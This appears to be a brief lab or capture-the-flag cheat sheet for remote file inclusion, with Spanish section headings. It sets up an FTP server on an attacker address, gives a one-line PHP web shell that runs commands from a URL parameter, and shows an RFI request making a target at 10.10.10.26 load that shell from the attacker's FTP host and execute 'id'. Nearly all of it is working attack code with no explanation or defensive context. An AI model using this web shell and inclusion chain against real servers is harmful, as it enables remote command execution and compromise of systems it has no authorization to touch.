## Servidor FTP

```python
IP = 10.10.10.14

python -m pyftpdlib -p 21
```

## shell.php

```python
<?php system($_GET['cmd']); ?>
```

## RFI

```python
http://10.10.10.26/index.php?language=ftp://user:pass@10.10.10.14/shell.php&cmd=id
```
